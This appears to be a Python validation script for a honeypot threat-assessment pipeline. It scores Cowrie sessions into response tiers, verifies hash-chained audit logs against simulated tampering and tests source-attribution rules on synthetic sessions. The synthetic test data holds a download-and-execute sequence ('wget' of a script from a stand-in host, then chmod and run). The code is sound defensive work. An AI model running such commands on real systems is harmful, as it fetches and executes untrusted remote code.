"""Task 24: validate threat_assessment on Dataset V2 train/validation (no test, sealed or exfiltration data).

    .venv/Scripts/python.exe reports/threat_assessment_implementation_20261111/validate_assessment.py

1. Evidence: the UNCHANGED behavioural_evidence package on the V2 raw slices with an EXPLICIT configuration matching the
   verified attribution config (relay 172.22.0.2; internal networks = configs/threat_attribution_v1.json internal_cidrs),
   the Task 22 training calibration, and training reference sequences. Task 18 novelty attached as metadata (validation).
2. Assessment: configs/threat_attribution_v1.json + configs/defence_policy_v2.json.
3. Audit: one hash-chained log per split with a fixed run timestamp (deterministic); verified; tamper simulations.
4. Synthetic scenario checks (documentation addresses as stand-in clients; test data only) for attribution/config cases
   that the relay-based lab cannot exercise. No source attribution is manufactured for lab sessions.
Labels are post-hoc only. Writes only into this directory.
"""
import copy
import csv
import hashlib
import json
import sys
from collections import Counter, defaultdict
from pathlib import Path

import pandas as pd

HERE = Path(__file__).resolve().parent
REPO = HERE.parents[1]
sys.path.insert(0, str(REPO))
OPENED = []


def _audit(event, args):
    if event == "open" and args and isinstance(args[0], (str, Path)):
        p = str(args[0]).replace("\\", "/").lower()
        if "ml_pipeline/work/test" in p or "sealed" in p or "/runs/test" in p or "exfiltration" in p:
            raise RuntimeError(f"blocked: {p}")
        OPENED.append(p)


sys.addaudithook(_audit)
from behavioural_evidence import EvidenceConfig, EvidenceEngine  # noqa: E402
from behavioural_evidence.calibration import load_calibration  # noqa: E402
from behavioural_evidence.engine import read_jsonl  # noqa: E402
from threat_assessment import AuditLog, ThreatAssessor, load_attribution_config, load_policy, verify_chain  # noqa: E402
from threat_assessment.audit import entry_hash, read_log  # noqa: E402

DS = REPO / "reports" / "dataset_v2_training_validation_20261110"
T22 = REPO / "reports" / "behavioural_evidence_framework_implementation_20261111"
T18 = REPO / "reports" / "cowrie_novelty_baseline_20261111" / "outputs" / "validation_scores.csv"
OUT = HERE / "evidence"
OUT.mkdir(exist_ok=True)
SPLITS = ("train", "validation")
RUN_TS = "2026-11-11T00:00:00Z"            # fixed audit timestamp for a deterministic, reproducible validation run


def sha(p):
    return hashlib.sha256(Path(p).read_bytes()).hexdigest()


for line in (DS / "SHA256SUMS").read_text(encoding="utf-8").splitlines():
    h, name = line.split(maxsplit=1)
    assert sha(DS / name.lstrip("*").lstrip("./")) == h

att = load_attribution_config(REPO / "configs" / "threat_attribution_v1.json")
pol = load_policy(REPO / "configs" / "defence_policy_v2.json")
cal = load_calibration(T22 / "config" / "sensor_calibration_lab_train.json")
events = {s: read_jsonl(DS / "raw" / s / "cowrie_slice.json") for s in SPLITS}
ref_seq = frozenset(tuple(v) for v in pd.DataFrame(
    [(e["session"], e["timestamp"], e["input"]) for e in events["train"]
     if e["eventid"] == "cowrie.command.input" and e["input"].strip() not in ("exit", "logout")],
    columns=["s", "t", "i"]).sort_values(["s", "t"], kind="stable").groupby("s").i.apply(tuple))
ecfg = EvidenceConfig(relay_sources=frozenset(att.relay_strings), internal_networks=att.internal_cidr_strings, calibration=cal,
                      reference_sequences=ref_seq)
nov = {r.session_ref: {"C_input_knn": float(r.C_input_knn), "C_flag": bool(r.C_input_knn_flag_seed42)} for r in pd.read_csv(T18).itertuples()}
labels = {s: pd.read_csv(DS / "labels" / f"{s}_session_labels.csv", dtype=str).set_index("session_ref") for s in SPLITS}
assessor = ThreatAssessor(att, pol, ecfg)

evidence, assessed = {}, {}
for s in SPLITS:
    evidence[s] = EvidenceEngine(ecfg).evaluate(events[s], novelty=nov if s == "validation" else None)["sessions"]
    assessed[s] = [assessor.assess(r) for r in evidence[s]]
    for name, rows in (("evidence", evidence[s]), ("assessments", assessed[s])):
        with open(OUT / f"{s}_{name}.jsonl", "w", encoding="utf-8", newline="\n") as f:
            for r in rows:
                f.write(json.dumps(r, sort_keys=True) + "\n")

# ---- audit logs
audit_rows = []
for s in SPLITS:
    p = OUT / f"{s}_audit.jsonl"
    if p.exists():
        p.unlink()                                         # this run's own output only (re-created deterministically)
    log = AuditLog(f"task24-{s}", path=p, clock=lambda: RUN_TS)
    for a in assessed[s]:
        log.append(a)
    ck = log.checkpoint()
    (OUT / f"{s}_audit_checkpoint.json").write_text(json.dumps(ck, indent=2) + "\n", encoding="utf-8")
    ents = read_log(p)
    v = verify_chain(ents, ck)
    audit_rows.append({"split": s, "test": "verify persisted chain with checkpoint", "expected": "ok", "result": "ok" if v["ok"] else v["reason"],
                       "passed": v["ok"], "entries": len(ents), "last_hash": ck["last_hash"]})
    audit_rows.append({"split": s, "test": "every entry execution_status = not_executed", "expected": "true",
                       "result": str(all(e["execution_status"] == "not_executed" for e in ents)), "passed": all(e["execution_status"] == "not_executed" for e in ents)})
    audit_rows.append({"split": s, "test": "proposals have inverse + pending approval", "expected": "all", "passed":
                       all(e["inverse_operation"] and e["manual_approval_status"] == "pending" for e in ents if e["tier"] == "propose"),
                       "result": f"{sum(e['tier'] == 'propose' for e in ents)} proposals"})
    for attack in ("modify_tier", "modify_source", "delete_entry", "reorder", "insert_duplicate", "truncate_tail", "recompute_hash_after_edit", "mark_executed"):
        t = copy.deepcopy(ents)
        if attack == "modify_tier":
            t[5]["tier"] = "propose"
        elif attack == "modify_source":
            t[7]["source"] = "203.0.113.9"
        elif attack == "delete_entry":
            del t[10]
        elif attack == "reorder":
            t[3], t[4] = t[4], t[3]
        elif attack == "insert_duplicate":
            t.insert(2, copy.deepcopy(t[2]))
        elif attack == "truncate_tail":
            t = t[:-3]
        elif attack == "recompute_hash_after_edit":
            t[5]["tier"] = "propose"
            t[5]["record_hash"] = entry_hash(t[5])
        elif attack == "mark_executed":
            t[0]["execution_status"] = "executed"
            t[0]["record_hash"] = entry_hash(t[0])
        r = verify_chain(t, ck)
        audit_rows.append({"split": s, "test": f"tamper: {attack}", "expected": "detected", "result": r["reason"], "passed": not r["ok"],
                           "entries": len(t), "detected_at_index": r["index"]})

# ---- tier results
tier_rows, gate_rows = [], []
for s in SPLITS:
    lab = labels[s]
    df = pd.DataFrame([{"session_ref": a["session_ref"], "tier": a["tier"], "cat": lab.loc[a["session_ref"], "attack_cat"],
                        "role": lab.loc[a["session_ref"], "role"], **{k: v for k, v in a["gates"].items()},
                        "attribution": a["session_attribution"]["state"], "novelty_flag": bool(a["novelty_annotation"] and a["novelty_annotation"]["value"].get("C_flag")),
                        "caveats": ";".join(a["caveat_annotations"])} for a in assessed[s]])
    for unit, m in (("all_sessions", df.role.notna()), ("logged_in", df.role == "logged_in"), ("failed_guess", df.role != "logged_in")):
        for t in ("abstain", "record", "review", "propose"):
            sub = df[m & (df.tier == t)]
            tier_rows.append({"split": s, "unit": unit, "tier": t, "sessions": len(sub), **{c: int((sub.cat == c).sum()) for c in sorted(lab.attack_cat.unique())}})
    rv = df[df.tier == "review"]
    for g in [c for c in df.columns if c[0].isdigit()]:
        gate_rows.append({"split": s, "gate": g, "review_sessions_failing": int((~rv[g]).sum()), "review_sessions": len(rv),
                          "all_sessions_failing": int((~df[g]).sum())})
    gate_rows.append({"split": s, "gate": "attribution states (all sessions)", "review_sessions_failing": None, "review_sessions": None,
                      "all_sessions_failing": json.dumps(df.attribution.value_counts().to_dict())})
    gate_rows.append({"split": s, "gate": "novelty-flagged sessions by tier", "all_sessions_failing": json.dumps(df[df.novelty_flag].tier.value_counts().to_dict())})
    gate_rows.append({"split": s, "gate": "ART-1 sessions by tier", "all_sessions_failing": json.dumps(df[df.caveats.str.contains("ART-1")].tier.value_counts().to_dict())})
    gate_rows.append({"split": s, "gate": "benign sessions above record", "all_sessions_failing": int(((df.cat == "benign") & df.tier.isin(["review", "propose"])).sum())})
pd.DataFrame(tier_rows).to_csv(HERE / "policy_tier_results.csv", index=False)
pd.DataFrame(gate_rows).to_csv(OUT / "gate_failure_summary.csv", index=False)

# ---- severity validation
sev_rows = []
for s in SPLITS:
    lab = labels[s]
    c = defaultdict(Counter)
    basis = defaultdict(Counter)
    for a in assessed[s]:
        for f in a["findings"]:
            key = (f["interpretation"], f["severity"], f["evidence_level"], f["success_observed"])
            c[key][lab.loc[a["session_ref"], "attack_cat"]] += 1
            if f["interpretation"] == "credential-material access attempt":
                basis[(f["severity"],)][f["severity_basis"].split(":")[0][:60]] += 1
    for (i, sv, lv, ok), cats in sorted(c.items()):
        sev_rows.append({"split": s, "interpretation": i, "severity": sv, "evidence_level": lv, "success_observed": ok,
                         "findings": sum(cats.values()), **{k: cats.get(k, 0) for k in sorted(lab.attack_cat.unique())}})
    for (sv,), b in basis.items():
        for txt, n in b.most_common(8):
            sev_rows.append({"split": s, "interpretation": "credential-material access attempt (basis)", "severity": sv, "findings": n,
                             "evidence_level": "", "success_observed": "", "basis": txt})
pd.DataFrame(sev_rows).to_csv(HERE / "severity_validation.csv", index=False)

# ---- synthetic attribution scenarios (documentation addresses as stand-in clients; never lab identities)
from datetime import datetime, timedelta, timezone  # noqa: E402
T0 = datetime(2026, 11, 10, 10, 0, 0, tzinfo=timezone.utc)


def ev(sid, eid, t, src, **f):
    e = {"eventid": eid, "session": sid, "timestamp": (T0 + timedelta(seconds=t)).isoformat().replace("+00:00", "Z"), **f}
    if src is not None:
        e["src_ip"] = src
    return e


def sess(sid, src, lines, fail=0, t0=0.0):
    out = [ev(sid, "cowrie.session.connect", t0, src)]
    t = t0 + 0.1
    for k in range(fail):
        out.append(ev(sid, "cowrie.login.failed", t, src, username="root", password=f"p{k}"))
        t += 0.1
    out.append(ev(sid, "cowrie.login.success", t, src, username="root", password="ok"))
    for ln in lines:
        t += 1
        out.append(ev(sid, "cowrie.command.input", t, src, input=ln))
    out.append(ev(sid, "cowrie.session.closed", t + 0.5, src, duration="1.0"))
    return out


L = ["wget http://h.example/x.sh -O x.sh", "chmod +x x.sh", "./x.sh"]
scen = [("external client (documentation address)", "203.0.113.50", "attributable", "propose"),
        ("lab relay 172.22.0.2", "172.22.0.2", "unattributed:trusted_proxy", "review"),
        ("Cowrie container 172.22.0.1 (protected)", "172.22.0.1", "protected", "review"),
        ("relay frontend 172.21.0.2 (protected)", "172.21.0.2", "protected", "review"),
        ("legacy docker 172.19.0.1 (protected)", "172.19.0.1", "protected", "review"),
        ("loopback 127.0.0.1 (protected)", "127.0.0.1", "protected", "review")]
att_rows = []
for name, ip, exp_state, exp_tier in scen:
    r = EvidenceEngine(ecfg).evaluate(sess("s", ip, L))["sessions"][0]
    a = assessor.assess(r)
    att_rows.append({"scenario": name, "src_ip": ip, "expected_state": exp_state, "state": a["session_attribution"]["state"],
                     "expected_tier": exp_tier, "tier": a["tier"], "passed": a["session_attribution"]["state"] == exp_state and a["tier"] == exp_tier})
# NAT/shared via a config variant (shared list is empty in the deployment config)
shared_doc = json.loads((REPO / "configs" / "threat_attribution_v1.json").read_text(encoding="utf-8"))
shared_doc["shared_source_cidrs"] = ["198.51.100.0/24"]
from threat_assessment.config import AttributionConfig, PolicyConfig, canonical_digest  # noqa: E402
pdoc = json.loads((REPO / "configs" / "defence_policy_v2.json").read_text(encoding="utf-8"))
pdoc["attribution_config"]["sha256_digest"] = canonical_digest(shared_doc)
sa = ThreatAssessor(AttributionConfig.from_document(shared_doc), PolicyConfig.from_document(pdoc), ecfg)
a = sa.assess(EvidenceEngine(ecfg).evaluate(sess("s", "198.51.100.7", L))["sessions"][0])
att_rows.append({"scenario": "NAT/shared source (config variant with 198.51.100.0/24)", "src_ip": "198.51.100.7", "expected_state": "shared_source",
                 "state": a["session_attribution"]["state"], "expected_tier": "review", "tier": a["tier"],
                 "passed": a["session_attribution"]["state"] == "shared_source" and a["tier"] == "review"})
r = EvidenceEngine(ecfg).evaluate(sess("s", "172.22.0.2", L))["sessions"][0]
r["x_forwarded_for"] = "203.0.113.50"
a = assessor.assess(r)
att_rows.append({"scenario": "untrusted forwarded header (x_forwarded_for=203.0.113.50 on a relay session)", "src_ip": "172.22.0.2",
                 "expected_state": "unattributed:trusted_proxy", "state": a["session_attribution"]["state"], "expected_tier": "review", "tier": a["tier"],
                 "passed": a["session_attribution"]["state"] == "unattributed:trusted_proxy" and a["session_attribution"]["ignored_untrusted_fields"] == ["x_forwarded_for"]})
r = EvidenceEngine(ecfg).evaluate(sess("s", "203.0.113.50", L))["sessions"][0]
r["src_ip"] = None
a = assessor.assess(r)
att_rows.append({"scenario": "missing source address", "src_ip": None, "expected_state": "unattributed:no_source", "state": a["session_attribution"]["state"],
                 "expected_tier": "review", "tier": a["tier"], "passed": a["session_attribution"]["state"] == "unattributed:no_source" and a["tier"] != "propose"})
r = EvidenceEngine(ecfg).evaluate(sess("s", "203.0.113.50", L))["sessions"][0]
r["config_digest"] = "deadbeefdeadbeef"
a = assessor.assess(r)
att_rows.append({"scenario": "incorrect evidence config digest", "src_ip": "203.0.113.50", "expected_state": "attributable", "state": a["session_attribution"]["state"],
                 "expected_tier": "review", "tier": a["tier"], "passed": a["tier"] == "review" and not a["gates"]["7_verified_configuration_digests"]})
del r["config_digest"]
a = assessor.assess(r)
att_rows.append({"scenario": "missing evidence config digest", "src_ip": "203.0.113.50", "expected_state": "attributable", "state": a["session_attribution"]["state"],
                 "expected_tier": "abstain", "tier": a["tier"], "passed": a["tier"] == "abstain"})
for s in SPLITS:
    st = Counter(a["session_attribution"]["state"] for a in assessed[s])
    fs = Counter(f["attribution"]["state"] for a in assessed[s] for f in a["findings"])
    att_rows.append({"scenario": f"Dataset V2 {s}: all sessions (lab relay topology)", "src_ip": "172.22.0.2", "expected_state": "unattributed:trusted_proxy",
                     "state": json.dumps(dict(st)), "expected_tier": "no proposals", "tier": json.dumps(dict(Counter(a["tier"] for a in assessed[s]))),
                     "passed": set(st) == {"unattributed:trusted_proxy"} and set(fs) <= {"unattributed:trusted_proxy"}
                     and not any(a["tier"] == "propose" for a in assessed[s])})
pd.DataFrame(att_rows).to_csv(HERE / "source_attribution_tests.csv", index=False)
pd.DataFrame(audit_rows).to_csv(HERE / "audit_integrity_results.csv", index=False)

# ---- determinism: second assessment pass is byte-identical; evidence records unchanged by assessment
det = {}
for s in SPLITS:
    again = [ThreatAssessor(att, pol, ecfg).assess(r) for r in evidence[s]]
    det[s] = json.dumps(again, sort_keys=True) == json.dumps(assessed[s], sort_keys=True)
summary = {"evidence_config_digest": ecfg.digest(), "attribution_config_digest": att.digest, "policy_digest": pol.digest,
           "configuration_checks": assessor.config_checks, "deterministic_second_pass": det,
           "tiers": {s: dict(Counter(a["tier"] for a in assessed[s])) for s in SPLITS},
           "proposals": {s: sum(a["tier"] == "propose" for a in assessed[s]) for s in SPLITS},
           "audit_checkpoints": {s: json.loads((OUT / f"{s}_audit_checkpoint.json").read_text()) for s in SPLITS},
           "test_like_paths_opened": [p for p in OPENED if "test" in p.rsplit("/", 1)[-1] and p.endswith((".pkl", ".csv", ".json", ".jsonl"))]}
(OUT / "validation_summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")
print(json.dumps(summary, indent=1))
print(pd.DataFrame(tier_rows)[lambda d: d.unit == "all_sessions"].to_string(index=False))
print(pd.DataFrame(att_rows)[["scenario", "state", "tier", "passed"]].to_string(index=False))
print(pd.DataFrame(audit_rows)[["split", "test", "passed"]].to_string(index=False))
